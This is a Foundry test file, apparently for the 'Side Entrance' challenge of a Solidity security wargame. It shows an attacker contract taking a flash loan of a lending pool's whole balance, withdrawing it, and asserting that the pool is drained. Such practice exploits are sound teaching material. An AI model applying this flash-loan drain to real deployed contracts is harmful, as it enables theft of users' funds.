// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {console2} from "forge-std/Test.sol";

import {UtilsTest} from "./Utils.t.sol";

contract SideEntranceLenderPoolTest is UtilsTest {
    function setUp() public override {
        UtilsTest.setUp();
    }

    function testAttack() public {
        vm.startPrank(address(attack));

        console2.log("Pool Funds ", address(pool).balance);
        console2.log("Attacker funds ", address(attack).balance);

        pool.flashLoan(address(pool).balance);

        pool.withdraw();

        assertEq(address(pool).balance, 0);
        assertEq(address(attack).balance, 1e24);

        console2.log("Pool Funds ", address(pool).balance);
        console2.log("Attacker funds ", address(attack).balance);
        vm.stopPrank();
    }
}
